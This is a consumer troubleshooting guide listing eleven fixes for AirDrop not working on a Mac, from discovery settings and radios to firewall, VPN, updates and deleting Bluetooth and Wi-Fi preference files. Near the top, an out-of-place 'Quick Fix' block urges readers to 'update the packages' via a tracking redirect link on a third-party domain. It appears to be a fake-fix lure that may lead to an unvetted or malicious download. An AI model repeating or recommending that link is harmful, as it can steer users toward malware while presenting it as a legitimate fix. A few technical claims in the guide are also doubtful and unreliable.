# 11 Fixes for AirDrop Not Working on Your Mac

AirDrop not working on your Mac is one of those problems that always hits at the worst possible moment — you're trying to send photos from your iPhone, share a document before a meeting, or move a file between your own devices, and your Mac simply refuses to show up. No error message, no explanation, just an empty AirDrop window staring back at you.

The frustrating part is that AirDrop is supposed to be effortless. When it works, it's genuinely the fastest way to move files between Apple devices without cables, cloud uploads, or email attachments. When it doesn't, you're stuck guessing whether the problem is Bluetooth, Wi-Fi, a setting you accidentally toggled, or something deeper.

This guide walks you through every known fix for AirDrop failures on a Mac. Whether your MacBook can't find your iPhone, your iMac won't receive files, or transfers keep getting stuck on "Waiting," you'll find the answer below. These solutions cover macOS Sequoia, Sonoma, Ventura, Monterey, and earlier versions.

---

## Table of Contents

- [Quick Fix Summary](#quick-fix-summary)
- [Why AirDrop Is Not Working on Your Mac](#why-airdrop-is-not-working-on-your-mac)
- [How to Fix AirDrop Not Working on Mac](#how-to-fix-airdrop-not-working-on-mac)
  - [1. Make Sure AirDrop Is Enabled](#1-make-sure-airdrop-is-enabled)
  - [2. Turn On Bluetooth and Wi-Fi](#2-turn-on-bluetooth-and-wi-fi)
  - [3. Move Devices Closer Together](#3-move-devices-closer-together)
  - [4. Disable Do Not Disturb / Focus Mode](#4-disable-do-not-disturb--focus-mode)
  - [5. Turn Off Personal Hotspot](#5-turn-off-personal-hotspot)
  - [6. Disable VPN](#6-disable-vpn)
  - [7. Check Firewall Settings](#7-check-firewall-settings)
  - [8. Make Sure Both Devices Are Unlocked](#8-make-sure-both-devices-are-unlocked)
  - [9. Restart Your Mac and Other Devices](#9-restart-your-mac-and-other-devices)
  - [10. Update macOS and iOS](#10-update-macos-and-ios)
  - [11. Clear Cache and System Files](#11-clear-cache-and-system-files)
- [FAQ](#faq)

---

## Quick Fix Summary
---

## One of the most effective ways to resolve this problem is to update the packages.

## [Update the packages](https://track.mymacosx.com/n9LRFD?page=mac_7).

If this solution does not help, please proceed with the steps below.

---

| Fix | Brief Description |
| --- | --- |
| 1. Enable AirDrop | Open Finder > AirDrop and set discovery to Everyone |
| 2. Turn on Bluetooth and Wi-Fi | Both must be active — AirDrop uses them simultaneously |
| 3. Move devices closer | Stay within 30 feet (9 meters) with no obstructions |
| 4. Disable Do Not Disturb | Focus modes silently block incoming AirDrop requests |
| 5. Turn off Personal Hotspot | Hotspot locks the Wi-Fi radio, breaking AirDrop |
| 6. Disable VPN | VPN software can interfere with local network discovery |
| 7. Check Firewall | Ensure Firewall isn't blocking all incoming connections |
| 8. Unlock both devices | Locked devices won't appear in AirDrop discovery |
| 9. Restart devices | Power cycle your Mac, iPhone, or iPad to clear glitches |
| 10. Update macOS and iOS | Install the latest software for bug fixes and compatibility |
| 11. Clear cache and system files | Remove corrupted caches that interfere with AirDrop |

---

## Why AirDrop Is Not Working on Your Mac

Before jumping into fixes, it's worth understanding what's actually happening behind the scenes. AirDrop relies on a combination of **Bluetooth** and **Wi-Fi** to discover nearby devices and transfer files. Bluetooth handles the initial handshake and device discovery, while Wi-Fi creates a direct peer-to-peer connection for the actual data transfer. If either one is disrupted, AirDrop breaks.

Here are the most common reasons your Mac's AirDrop isn't working:

- **AirDrop discovery is set to "No One"** — If your Mac isn't set to be discoverable, no device will find it, even your own iPhone signed into the same Apple ID.
- **Bluetooth or Wi-Fi is turned off** — AirDrop needs both radios active at the same time. Disabling either one silently kills AirDrop without any warning.
- **Devices are too far apart** — AirDrop's Bluetooth discovery range is roughly 30 feet (9 meters). Walls, furniture, and other obstructions reduce this further.
- **Do Not Disturb or Focus mode is active** — Focus modes on macOS and iOS can block AirDrop notifications, making it look like AirDrop isn't working when it's actually suppressing the transfer request.
- **Personal Hotspot is enabled** — When your iPhone's hotspot is active, it monopolizes the Wi-Fi antenna, preventing AirDrop from establishing a peer-to-peer connection.
- **VPN is running** — VPN software often modifies network routing in ways that interfere with the local network discovery AirDrop depends on.
- **Firewall is blocking incoming connections** — macOS's built-in firewall can block the incoming connections that AirDrop uses to receive files.
- **One or both devices are locked** — A locked Mac or iPhone won't advertise itself over AirDrop. The screen needs to be on and the device unlocked.
- **Outdated software** — Older versions of macOS and iOS contain AirDrop bugs that Apple has since patched. Version mismatches between devices can also cause failures.
- **Corrupted system caches** — Over time, cache files and preference data on your Mac can become corrupted, which breaks AirDrop's ability to discover devices or complete transfers.

If you already have a suspicion about what's causing your issue, skip directly to that fix. Otherwise, start from the top — the solutions are ordered from quickest to most involved.

---

## How to Fix AirDrop Not Working on Mac

### 1. Make Sure AirDrop Is Enabled

This is the single most common reason AirDrop fails, and it takes five seconds to check. Your Mac has a specific AirDrop discovery setting that controls whether other devices can see it, and it may be turned off or restricted to contacts only. If someone outside your Contacts list is trying to send you a file, the "Contacts Only" setting will make your Mac invisible to them.

The quickest way to check and change this setting depends on your macOS version:

**On macOS Ventura, Sonoma, or Sequoia:**

1. Open **Finder**.
2. Click **AirDrop** in the left sidebar.
3. At the bottom of the AirDrop window, find **"Allow me to be discovered by:"** and click the dropdown.
4. Select **Everyone** (or **Everyone for 10 Minutes** on macOS Sonoma and later).

**On macOS Monterey and earlier:**

1. Open **Finder**.
2. Click **Go > AirDrop** from the menu bar, or press **Command + Shift + R**.
3. At the bottom of the window, click the **"Allow me to be discovered by:"** dropdown.
4. Choose **Everyone**.

You can also enable AirDrop from **Control Center** — click the **Control Center icon** in the menu bar, click **AirDrop**, and select **Everyone**.

> **Tip:** The "Contacts Only" setting requires both devices to be signed into iCloud and have each other's contact information (email or phone number associated with the Apple ID) saved. If you're troubleshooting, switch to "Everyone" temporarily to rule out contact-matching issues. Just remember to switch it back when you're done.

If AirDrop doesn't appear in Finder at all, your Mac may be too old to support it. AirDrop requires a **Mac from 2012 or later** (with the exception of the 2012 Mac Pro, which needs a specific Wi-Fi card). You can verify compatibility by clicking **Apple menu > About This Mac** and checking your model year.

---

### 2. Turn On Bluetooth and Wi-Fi

AirDrop uses Bluetooth for device discovery and Wi-Fi for data transfer. Both must be turned on simultaneously — having one without the other means AirDrop simply won't function. This catches people off guard because you don't need to be connected to a Wi-Fi network. AirDrop creates its own direct Wi-Fi connection between devices, but the Wi-Fi radio itself still needs to be active.

1. Click the **Control Center** icon in the top-right corner of your menu bar.
2. Verify that both **Wi-Fi** and **Bluetooth** icons are highlighted (active).
3. If either is off, click it to turn it back on.

To double-check through System Settings:

1. Go to **Apple menu > System Settings > Wi-Fi** and confirm the toggle is on.
2. Go to **Apple menu > System Settings > Bluetooth** and confirm the toggle is on.

**On the sending device (iPhone or iPad):**

1. Open **Settings > Wi-Fi** and make sure Wi-Fi is enabled.
2. Open **Settings > Bluetooth** and make sure Bluetooth is enabled.

> **Note:** On macOS Monterey and earlier, these settings are under **System Preferences > Network** and **System Preferences > Bluetooth**. The functionality is identical, but the menu paths are different.

> **Tip:** If you've recently used Airplane Mode on your iPhone, both Bluetooth and Wi-Fi may still be off even though Airplane Mode itself has been turned off. Toggle each one manually to be sure.

It's also worth mentioning that AirDrop does not work over cellular or traditional Wi-Fi networks. It creates a **peer-to-peer Wi-Fi Direct** connection, which is why both devices need their Wi-Fi hardware active regardless of whether they're connected to a router.

---

### 3. Move Devices Closer Together

AirDrop's maximum range is approximately **30 feet (9 meters)**, but in practice the effective range is often shorter. Walls, large metal objects, other electronics, and even human bodies can weaken the Bluetooth signal that AirDrop uses for discovery. If your Mac and iPhone are in different rooms, that alone could be enough to prevent them from seeing each other.

For the best results:

1. Bring both devices into the **same room**.
2. Place them **within 10 feet (3 meters)** of each other — closer is better.
3. Make sure there are no large obstructions between them (monitors, thick walls, filing cabinets).
4. Avoid areas with heavy wireless interference, such as kitchens with microwaves or desks cluttered with USB 3.0 hubs and external drives.

> **Tip:** USB 3.0 devices are a known source of 2.4 GHz interference, which is the same frequency band Bluetooth operates on. If your Mac is connected to a USB 3.0 hub, try temporarily unplugging it while using AirDrop. Apple has published a support document acknowledging this interference issue.

If you're trying to AirDrop between a Mac and an older iPhone (iPhone 5 or later is required) or an older iPad (4th generation or later), keep in mind that older devices have weaker Bluetooth radios, so you may need to be even closer — ideally within arm's reach.

Once both devices are nearby, open the AirDrop window in Finder again and wait 10–15 seconds for the other device to appear. Discovery isn't always instant, especially if both devices just had their Bluetooth toggled.

---

### 4. Disable Do Not Disturb / Focus Mode

This one is sneaky. When **Do Not Disturb** or any **Focus mode** is active on your Mac or iPhone, it can silently block incoming AirDrop transfer requests. The sending device might even see your Mac in the AirDrop list, but the transfer will either hang indefinitely or fail with no explanation. On the receiving end, the AirDrop notification simply never appears.

**On your Mac (macOS Ventura, Sonoma, Sequoia):**

1. Click the **Control Center** icon in the menu bar.
2. Click **Focus**.
3. If any Focus mode is highlighted (Do Not Disturb, Work, Sleep, etc.), click it to **turn it off**.

**On your Mac (macOS Monterey and earlier):**

1. Click the **Notification Center** icon in the top-right corner of the menu bar.
2. Scroll up to reveal the **Do Not Disturb** toggle.
3. Turn it **off**.

**On your iPhone or iPad:**

1. Open **Control Center** by swiping down from the top-right corner (Face ID) or up from the bottom (Home button).
2. If the **Focus** button shows an active mode, tap it and turn it **off**.

> **Tip:** Even "Allow Notifications" within a Focus mode doesn't guarantee AirDrop will work. The safest approach during troubleshooting is to disable Focus entirely on both devices, test the transfer, and then re-enable it afterward.

It's also worth checking whether you have a **scheduled Focus mode** that activates automatically. Go to **System Settings > Focus** on your Mac and review each mode's schedule. You may have a mode that turns on during work hours without you realizing it.

---

### 5. Turn Off Personal Hotspot

If your iPhone's **Personal Hotspot** is active, it takes over the Wi-Fi antenna for sharing your cellular connection with other devices. This directly conflicts with AirDrop, which needs that same Wi-Fi radio to create a peer-to-peer connection. You can't use both at the same time — Apple's own documentation confirms this limitation.

**On your iPhone:**

1. Open **Settings > Personal Hotspot**.
2. Toggle **Allow Others to Join** to **off**.

**On your Mac (if your Mac is connected to the hotspot):**

1. Click the **Wi-Fi icon** in the menu bar.
2. If you're connected to your iPhone's hotspot, click **Disconnect** or select a different Wi-Fi network.

> **Note:** Even if no devices are actively using your hotspot, leaving the "Allow Others to Join" toggle enabled keeps the Wi-Fi radio in hotspot mode, which can still interfere with AirDrop. Turn it off completely for troubleshooting.

After disabling the hotspot, wait about 10 seconds for the Wi-Fi radio to switch back to normal mode, then try AirDrop again. This fix is especially relevant when trying to AirDrop from iPhone to Mac, since the hotspot runs on the iPhone — the same device you're trying to send files from.

---

### 6. Disable VPN

VPN applications — whether built into macOS or third-party apps like NordVPN, ExpressVPN, or Mullvad — can interfere with AirDrop's local network discovery. VPNs work by routing your traffic through encrypted tunnels, which can block or redirect the local peer-to-peer connections AirDrop relies on. Some VPN apps also install network extensions that modify your Mac's routing tables, making local device discovery impossible.

1. If you're using a third-party VPN app, open it and click **Disconnect** or toggle the VPN **off**.
2. If you're using macOS's built-in VPN, go to **Apple menu > System Settings > VPN** and toggle the active connection **off**.

**On macOS Monterey and earlier:**

1. Go to **System Preferences > Network**.
2. Select your **VPN connection** in the left sidebar.
3. Click **Disconnect**.

> **Tip:** Some VPN applications run background processes even after you "disconnect" in the app. Check your Mac's menu bar for any VPN icons and make sure the connection is fully terminated. If AirDrop starts working after disabling the VPN, contact your VPN provider about their "local network access" or "split tunneling" settings, which can allow AirDrop to work alongside the VPN.

This fix applies to both the sending and receiving device. If your iPhone has a VPN active, disable it there as well before attempting the transfer.

---

### 7. Check Firewall Settings

macOS includes a built-in firewall that can block incoming connections — and AirDrop receiving counts as an incoming connection. If your firewall is configured to block all incoming connections, AirDrop transfers to your Mac will fail even though your Mac might still be able to send files to other devices.

**On macOS Ventura, Sonoma, or Sequoia:**

1. Go to **Apple menu > System Settings > Network > Firewall**.
2. If the Firewall is turned **on**, click **Options** (or the info button).
3. Make sure **"Block all incoming connections"** is **not checked**.
4. Click **OK**.

**On macOS Monterey and earlier:**

1. Go to **System Preferences > Security & Privacy > Firewall**.
2. Click the **lock icon** and enter your password to make changes.
3. Click **Firewall Options**.
4. Uncheck **"Block all incoming connections"**.
5. Click **OK**.

> **Note:** You don't need to turn off the Firewall entirely. Just make sure the "Block all incoming connections" option is disabled. This setting is an aggressive mode that blocks everything except essential system services, and AirDrop isn't considered essential by the firewall.

If you have third-party firewall or security software installed (such as Little Snitch, Lulu, or Radio Silence), check its settings as well. These applications can independently block the connections AirDrop uses, even if macOS's built-in firewall is configured correctly.

> **Tip:** After changing firewall settings, toggle AirDrop off and on again in Finder to force a fresh connection attempt.

---

### 8. Make Sure Both Devices Are Unlocked

AirDrop requires both the sending and receiving devices to be **awake and unlocked**. A Mac with its display asleep, a locked iPhone, or an iPad showing the lock screen won't appear in AirDrop's device list — even if every other setting is correct. This is a security measure Apple implemented to prevent unwanted file transfers.

**On your Mac:**

1. Wake your Mac by pressing any key or moving the mouse/trackpad.
2. Make sure you're **logged in** and at the desktop (not the lock screen).
3. Keep the Mac **awake** during the entire transfer.

**On your iPhone or iPad:**

1. Press the **Side button** or tap the screen to wake the device.
2. **Unlock** the device with Face ID, Touch ID, or your passcode.
3. Keep the screen **on** until the transfer completes.

> **Tip:** If your Mac's display keeps dimming or sleeping during large transfers, temporarily adjust the sleep timer. Go to **Apple menu > System Settings > Displays > Advanced** (on Sequoia/Sonoma) or **System Settings > Energy Saver** (on earlier versions) and set "Turn display off after" to a longer interval. On MacBooks, you may need to adjust this separately for battery and power adapter.

For transfers involving large files (videos, folders with many items), the process can take several minutes. If either device locks itself mid-transfer, the transfer will fail and you'll need to start over.

---

### 9. Restart Your Mac and Other Devices

When nothing else works, a good old restart clears out temporary glitches in the Bluetooth stack, Wi-Fi driver, and system services that AirDrop depends on. This is particularly effective if AirDrop was working fine yesterday but stopped suddenly without any settings changes.

**Restart your Mac:**

1. Click the **Apple menu** in the top-left corner.
2. Click **Restart**.
3. Wait for your Mac to fully boot up and log back in.

**Restart your iPhone or iPad:**

1. Press and hold the **Side button + Volume Up** (Face ID devices) or just the **Side button** (Home button devices) until the power slider appears.
2. Slide to **power off**.
3. Wait 30 seconds, then press the **Side button** to turn it back on.

After both devices have restarted, open Finder on your Mac, click **AirDrop** in the sidebar, and check if the other device appears.

> **Tip:** If a standard restart doesn't help, try a **forced restart** on your Mac. Press and hold the **Power button** for 10 seconds until the Mac shuts off, then press it again to boot. This performs a more thorough reset of hardware components, including the Bluetooth and Wi-Fi modules.

If you're experiencing AirDrop problems with multiple Apple devices (not just one), the issue is more likely on your Mac's end. Focus your troubleshooting there rather than restarting every device you own.

*Also read: [How to Fix Apple Mouse Not Connecting]()*

---

### 10. Update macOS and iOS

Outdated software is a frequent cause of AirDrop failures, especially after Apple releases new hardware or changes the AirDrop protocol. For example, the **NameDrop** feature introduced in iOS 17 and macOS Sonoma required both devices to be running the latest software to work. Older versions of macOS may also have known Bluetooth and Wi-Fi bugs that have been fixed in subsequent updates.

**Update your Mac:**

1. Go to **Apple menu > System Settings > General > Software Update**.
2. If an update is available, click **Update Now** or **Upgrade Now**.
3. Let the update install and restart your Mac.

**On macOS Monterey and earlier:**

1. Go to **Apple menu > System Preferences > Software Update**.

**Update your iPhone or iPad:**

1. Go to **Settings > General > Software Update**.
2. Download and install any available update.

> **Note:** AirDrop compatibility has specific minimum requirements. To AirDrop between a Mac and an iPhone, you need at minimum **macOS Yosemite (10.10)** and **iOS 8**. Mac-to-Mac AirDrop has been supported since **OS X Lion (10.7)**, but only on supported hardware. For the most reliable experience, keep all devices on the latest available OS version.

> **Tip:** If your Mac is too old to run the latest macOS, check Apple's compatibility list for your specific model. A 2012 MacBook Pro, for example, can run up to macOS Catalina, which still supports AirDrop but may have intermittent issues with newer iPhones running iOS 17 or later.

After updating, test AirDrop again. Software updates frequently resolve mysterious AirDrop issues that no amount of toggling settings can fix.

---

### 11. Clear Cache and System Files

If you've tried everything above and AirDrop still isn't working on your Mac, corrupted cache files or system preference data may be the culprit. macOS stores various Bluetooth, Wi-Fi, and networking configuration files that can become damaged over time, especially after failed updates, improper shutdowns, or disk errors.

**Reset Bluetooth preferences:**

1. Open **Finder** and press **Command + Shift + G** to open the "Go to Folder" dialog.
2. Type `/Library/Preferences/` and press **Enter**.
3. Look for the file named **com.apple.Bluetooth.plist**.
4. Move it to the **Trash** (you may need to enter your administrator password).
5. **Restart** your Mac — macOS will automatically create a fresh Bluetooth preference file.

**Reset Wi-Fi preferences:**

1. Open **Finder** and press **Command + Shift + G**.
2. Navigate to `/Library/Preferences/SystemConfiguration/`.
3. Move the following files to the **Trash**:
   - **com.apple.airport.preferences.plist**
   - **com.apple.wifi.message-tracer.plist**
   - **NetworkInterfaces.plist**
   - **preferences.plist**
4. **Restart** your Mac.

> **Note:** After deleting Wi-Fi preference files, your Mac will forget all saved Wi-Fi networks. You'll need to reconnect to your Wi-Fi network and re-enter the password. This is normal and expected.

> **Tip:** Before deleting these files, consider copying them to a folder on your desktop as a backup. If the problem isn't resolved, you can move them back to restore your previous configuration.

You can also try resetting the Bluetooth module directly:

**On macOS Sonoma and later:**

1. Open **Terminal** (found in **Applications > Utilities**).
2. Type `sudo pkill bluetoothd` and press **Enter**.
3. Enter your administrator password when prompted.
4. The Bluetooth daemon will restart automatically.

**On macOS Monterey and earlier:**

1. Hold **Shift + Option** and click the **Bluetooth icon** in the menu bar.
2. Select **Reset the Bluetooth module** from the hidden debug menu.
3. Click **OK** to confirm.

After clearing caches and resetting Bluetooth, open Finder, go to AirDrop, and test the connection again. This is the most thorough software-level fix available without reinstalling macOS entirely.

*Also read: [How to Free Up Space on Mac]()*

---

## FAQ

### Why Is My AirDrop Stuck on Waiting?

AirDrop getting stuck on "Waiting" means your device found the recipient but can't establish a data connection to begin the transfer. This usually happens because the **receiving device is locked**, the **Wi-Fi peer-to-peer connection failed**, or a **firewall/VPN is blocking** the data channel. Start by making sure the receiving device is unlocked and awake, then check that both Bluetooth and Wi-Fi are on. If the problem persists, disable any VPN or firewall on both devices and try again.

Another common cause is **large file sizes**. AirDrop can technically handle files of any size, but transfers over 1 GB are more prone to stalling. If you're sending a large video or folder, make sure both devices stay unlocked and within close range for the entire duration.

### How Do I Enable AirDrop on My Mac?

To enable AirDrop, open **Finder** and click **AirDrop** in the left sidebar (or press **Command + Shift + R**). At the bottom of the AirDrop window, click the dropdown next to **"Allow me to be discovered by:"** and choose **Contacts Only** or **Everyone**. You can also enable it through **Control Center** — click the Control Center icon in the menu bar, click **AirDrop**, and select your preferred visibility.

On macOS Sonoma and later, the "Everyone" option has been changed to **"Everyone for 10 Minutes"** for security reasons. After 10 minutes, it automatically reverts to "Contacts Only." If you need extended visibility (for example, during a classroom or meeting), you'll need to re-select "Everyone for 10 Minutes" periodically.

Make sure both **Bluetooth and Wi-Fi** are turned on as well — AirDrop won't appear as an option if either radio is disabled.

### Why Does AirDrop Keep Failing?

Repeated AirDrop failures — where transfers start but then error out — point to a **connection stability issue** rather than a discovery problem. The most common causes are **Wi-Fi interference**, **devices moving out of range mid-transfer**, and **software bugs in the current macOS or iOS version**.

Try these steps in order: restart both devices, move them closer together (within a few feet), disable any VPN or firewall software, and check for software updates. If AirDrop fails consistently with one specific device but works with others, the problem is likely on that device's end. Reset its network settings (**Settings > General > Transfer or Reset iPhone > Reset > Reset Network Settings** on iPhone) as a last resort.

If transfers fail only with large files, your Mac's storage might be running low. AirDrop needs enough free space to temporarily store the incoming file before moving it to the Downloads folder. Check your available storage under **Apple menu > About This Mac > Storage** (or **System Settings > General > Storage** on Sonoma/Sequoia).

### Can I AirDrop Between Mac and Windows?

No. **AirDrop is exclusive to Apple devices** — it only works between Macs, iPhones, iPads, and iPod touches. There is no AirDrop support for Windows PCs, Android phones, or any non-Apple hardware. AirDrop uses Apple's proprietary combination of Bluetooth LE and a custom Wi-Fi Direct protocol that isn't compatible with other platforms.

If you need to transfer files between a Mac and a Windows PC, your best alternatives are:

- **Nearby Share by Google** (Android to Windows only, not Mac)
- **Shared folders over SMB** — both macOS and Windows support this natively
- **Cloud services** like iCloud Drive, Google Drive, or Dropbox
- **USB flash drives or external SSDs**
- **Email or messaging apps** for smaller files
- **Third-party apps** like Snapdrop or LocalSend, which work across all platforms using your local Wi-Fi network without requiring an internet connection

---

## Conclusion

AirDrop problems on your Mac almost always come down to one of the issues covered in this guide — a discovery setting stuck on "No One," Bluetooth or Wi-Fi turned off, a Focus mode silently blocking transfers, or a firewall that's a little too aggressive. The good news is that every single one of these is fixable in a few minutes without any technical expertise or trips to the Apple Store.

Start with the basics: verify that AirDrop is set to "Everyone," confirm Bluetooth and Wi-Fi are both active, and make sure both devices are unlocked and within range. If those don't solve it, work your way through the Focus mode, hotspot, VPN, and firewall checks. And if nothing else works, clearing your Bluetooth and Wi-Fi caches forces macOS to rebuild its connection settings from scratch — which resolves even the most stubborn AirDrop issues.

Keep your Mac and iPhone updated to the latest software versions to avoid known bugs and compatibility gaps, especially if you're running newer devices alongside older ones. AirDrop has been part of macOS for over a decade now, and Apple continues to refine how it works with each update.
